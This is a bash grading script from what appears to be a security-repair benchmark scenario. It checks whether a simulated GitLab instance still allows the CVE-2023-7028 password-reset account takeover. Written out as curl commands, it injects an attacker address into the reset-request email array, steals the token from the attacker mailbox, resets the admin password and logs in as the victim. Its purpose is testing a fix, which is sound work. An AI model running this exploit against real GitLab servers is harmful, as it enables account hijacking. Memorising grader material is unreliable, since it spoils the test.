#!/bin/bash
# Scenario 14: GitLab password-reset account takeover (SIMULATION of
# CVE-2023-7028). Ground truth is BEHAVIOURAL against the LIVE service: the real
# exploit (request a reset for the victim with the attacker's address in the
# recipient array, read the token from the attacker's mailbox, reset the
# victim's password, then log in as the victim) must SUCCEED at baseline and be
# BLOCKED after the fix. A do-nothing agent leaves the takeover working.
#
# Two-component protocol: each check is recorded with its kind and NOTHING
# aborts early, so "closed the takeover but killed GitLab" is reported as
# security_pass=true / regression_pass=false rather than collapsing into a bare
# exit 1. See lib/verifylib.sh.
set -u

# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

IP=$(hostname -i 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=127.0.0.1
B="http://$IP:80"

code_of() { curl -s -m 5 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || echo 000; }

###############################################################################
# Regression: the service must already be up (do NOT start it).
###############################################################################
UP=0
for i in $(seq 1 20); do
    C=$(code_of "$B/users/sign_in")
    [ "$C" != "000" ] && { UP=1; break; }
    sleep 2
done
if [ "$UP" = "1" ]; then
    record_reg service_up 1
else
    record_reg service_up 0 "nothing serving on :80 (dead / not started)"
fi

VICTIM="admin@local.test"
ATTACKER="attacker@evil.test"
NEWPW="HvPwned_$$"

###############################################################################
# PoC: run the REAL account-takeover exploit end to end.
###############################################################################
# 1) Request reset for the victim, sneaking the attacker's address into the array.
curl -s -m 5 -X POST "$B/users/password" \
    --data "user%5Bemail%5D%5B%5D=$VICTIM&user%5Bemail%5D%5B%5D=$ATTACKER" >/dev/null 2>&1 || true

# 2) Read the token from the ATTACKER's mailbox (an inbox the attacker controls).
MBOX=$(curl -s -m 5 "$B/dev/mailbox?email=$ATTACKER" 2>/dev/null || true)
TOKEN=$(printf '%s' "$MBOX" | grep -oE '[0-9a-f]{32}' | head -1 || true)

TAKEOVER=0
if [ -n "$TOKEN" ]; then
    # 3) Use the stolen token to set a new password on the victim's account.
    curl -s -m 5 -X POST "$B/users/password" \
        --data "token=$TOKEN&user%5Bpassword%5D=$NEWPW" >/dev/null 2>&1 || true
    # 4) Confirm takeover: log in as the victim with the attacker-chosen password.
    LOGIN=$(code_of -X POST "$B/users/sign_in" \
        --data "user%5Blogin%5D=$VICTIM&user%5Bpassword%5D=$NEWPW")
    [ "$LOGIN" = "200" ] && TAKEOVER=1
fi
if [ "$TAKEOVER" = "1" ]; then
    record_poc account_takeover_blocked 0 "account takeover succeeded - attacker reset $VICTIM and logged in (CVE-2023-7028 exploitable)"
else
    record_poc account_takeover_blocked 1 "attacker received no reset token / could not log in as victim"
fi

###############################################################################
# Regression: legitimate single-address reset still delivers to that account.
###############################################################################
curl -s -m 5 -X POST "$B/users/password" --data "user%5Bemail%5D=$VICTIM" >/dev/null 2>&1 || true
OWN=$(curl -s -m 5 "$B/dev/mailbox?email=$VICTIM" 2>/dev/null || true)
if printf '%s' "$OWN" | grep -qE '[0-9a-f]{32}'; then
    record_reg legit_reset_delivers 1
else
    record_reg legit_reset_delivers 0 "legitimate password reset did not deliver a token to the account owner"
fi

###############################################################################
# The victim must still hold the ORIGINAL password, and the login endpoint must
# be healthy. These are two different claims and the original script conflated
# them into one "Regression 2":
#   * "the takeover did not change the password" is a PoC claim - at BASELINE
#     the exploit above rewrites it, so as a regression check it would report
#     the untouched box as damaged.
#   * "the login endpoint answers at all" is the regression claim; a total lack
#     of an HTTP response means the service was destroyed, not that the
#     vulnerability is present.
###############################################################################
ORIG=$(code_of -X POST "$B/users/sign_in" \
    --data "user%5Blogin%5D=$VICTIM&user%5Bpassword%5D=OrigAdminPass1")
# Normalise: on a refused connection curl PRINTS 000 and also exits 7, so the
# `|| echo 000` fallback in code_of appends a second 000 and the raw value is
# "000\n000". Reduce to the trailing 3-digit code before comparing. A real
# response (curl exit 0) is unaffected -- "200" stays "200".
ORIG=$(printf '%s' "$ORIG" | tr -dc '0-9' | tail -c 3)
if [ "$ORIG" = "000" ]; then
    # No HTTP response at all: the service is gone. Recording a PoC failure here
    # would let "killed GitLab" read as "left the takeover open".
    record_reg login_endpoint_healthy 0 "login endpoint gave no HTTP response (service unreachable)"
elif [ "$ORIG" = "200" ]; then
    record_reg login_endpoint_healthy 1
    record_poc victim_password_unchanged 1
else
    record_reg login_endpoint_healthy 1
    record_poc victim_password_unchanged 0 "victim's original credentials no longer work (HTTP $ORIG) - the takeover rewrote the password"
fi

verify_finish
